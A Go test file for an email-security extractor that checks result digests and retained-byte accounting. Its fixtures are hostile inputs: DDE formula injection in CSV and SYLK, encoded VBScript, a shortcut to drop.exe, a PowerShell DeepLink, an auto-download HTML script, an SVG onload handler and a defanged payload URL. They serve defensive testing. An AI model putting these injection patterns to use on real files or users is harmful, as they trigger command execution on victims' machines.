package extractionbudget_test

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"testing"
	"time"
	"unicode/utf16"

	"github.com/myguard-labs/mailstrix/internal/extract"
)

func p16dFinalBytes(res extract.Result) uint64 {
	var total uint64
	for _, stream := range res.Streams {
		total += uint64(len(stream))
	}
	for _, marker := range res.Markers {
		total += uint64(len(marker))
	}
	return total
}

func p16dResultDigest(t *testing.T, res extract.Result) string {
	t.Helper()
	res.Retained = extract.RetainedAccounting{}
	encoded, err := json.Marshal(res)
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(encoded)
	return hex.EncodeToString(sum[:])
}

func p16dUTF16LE(s string) []byte {
	units := utf16.Encode([]rune(s))
	out := make([]byte, 2, 2+2*len(units))
	out[0], out[1] = 0xff, 0xfe
	for _, unit := range units {
		out = append(out, byte(unit), byte(unit>>8))
	}
	return out
}

type p16dCase struct {
	name       string
	input      []byte
	wantDigest string
}

func p16dCases() []p16dCase {
	encodedScript := []byte("#@~^DgAAAA==" +
		"\x5c\x6b\x6f\x24\x4b\x36\x2c\x4a\x43\x7f\x56\x5e\x47\x4a\x71\x41\x51\x41\x41\x41\x3d\x3d" +
		"^#~@")
	inner := base64.StdEncoding.EncodeToString([]byte("P16D-INNER-PAYLOAD"))
	multiLayer := []byte(base64.StdEncoding.EncodeToString([]byte(inner)))
	return []p16dCase{
		{name: "script", input: encodedScript, wantDigest: "05d776378c43be99d1a6820cdf77443fedf9096ae2f95246ee6cd3ef34e605c4"},
		{name: "csv", input: []byte("=cmd|'/c calc.exe'!A1,plain\n"), wantDigest: "2fded7fbd697ecb620e339f14637abf8d6301be0d69eb7a216586b30b9931e02"},
		{name: "slk_folded", input: []byte("ID;PWXL;N;E\nC;Y1;X1;E=EXEC(CHAR(99)&CHAR(97)&CHAR(108)&CHAR(99))\n"), wantDigest: "fc9d62ac8ef370040169352b8a7cacad2a6be80005487367a209f1710ae73f4e"},
		{name: "slk_dde", input: []byte("ID;PWXL;N;E\nC;Y1;X1;E=cmd|'/c calc.exe'!A1\n"), wantDigest: "4ca9670e462c481f2f04766c0d196544f15f5a95b576c9200e6fe5b9967022eb"},
		{name: "launcher", input: []byte("[InternetShortcut]\nURL=file://host/share/drop.exe\n"), wantDigest: "4991b6911f8ef22f0c4ff7268a85195b8f485d6318bee3d6dde4e31017901f74"},
		{name: "setting_content", input: []byte(`<PCSettingsFile><DeepLink>powershell.exe -enc UDE2RA==</DeepLink></PCSettingsFile>`), wantDigest: "946a5cef0f219162b41381f5f74d63eacda8ff771eae83339ffacc794ef51779"},
		{name: "html", input: []byte(`<html><script>new Blob(["x"]);a.download="x";a.click()</script></html>`), wantDigest: "70c44b6cfd091edf68a45ae1f173251c2366355b115fbaa641aacd84f4247258"},
		{name: "svg", input: []byte(`<svg onload="alert(1)"></svg>`), wantDigest: "d375a51d5e17767f64d0b3427a9a734a92894fc285ed7209e5f5d45086e1847b"},
		{name: "utf16", input: p16dUTF16LE("powershell.exe -nop -w hidden"), wantDigest: "66f078a6204d38eb87ae067c19a42e6636611c2e4b34cf43de6a3868be731881"},
		{name: "defang", input: []byte("download hxxps[:]//evil[.]example/payload.exe now"), wantDigest: "74b14799b148b8e54718ef223fa582084208033d7341a09b3cbf5b693f4fd813"},
		{name: "multi_layer", input: multiLayer, wantDigest: "4c2a8f3508c43f2de0c679bb28140944f2b2543d818d96c924bc58e99965cdc2"},
	}
}

func TestP16dCompleteResultParity(t *testing.T) {
	for _, tc := range p16dCases() {
		t.Run(tc.name, func(t *testing.T) {
			res := extract.Extract(tc.input, time.Time{})
			if got := p16dResultDigest(t, res); got != tc.wantDigest {
				t.Fatalf("complete Result digest=%s want baseline=%s", got, tc.wantDigest)
			}
		})
	}
}

func TestP16dTextDecoderAccountingClosure(t *testing.T) {
	for _, tc := range p16dCases() {
		t.Run(tc.name, func(t *testing.T) {
			res := extract.Extract(tc.input, time.Time{})
			want := p16dFinalBytes(res)
			if want == 0 {
				t.Fatal("positive fixture emitted no accepted output")
			}
			if got := res.Retained.Bytes(); got != want {
				t.Fatalf("retained arithmetic closure=%d want final output bytes=%d", got, want)
			}
		})
	}
}

func TestP16dMalformedAndMinimumInputsRetainNothing(t *testing.T) {
	for _, input := range [][]byte{
		[]byte("#@~^short"),
		[]byte("ID;PWXL;N;E\nC;Y1;X1;K5\n"),
		[]byte("[InternetShortcut\nURL=file://host/x\n"),
		[]byte(`<PCSettingsFile><DeepLink>unterminated`),
		p16dUTF16LE("tiny"),
	} {
		res := extract.Extract(input, time.Time{})
		if got := res.Retained.Bytes(); got != 0 {
			t.Fatalf("malformed/minimum input retained=%d streams=%q markers=%q", got, res.Streams, res.Markers)
		}
	}
}
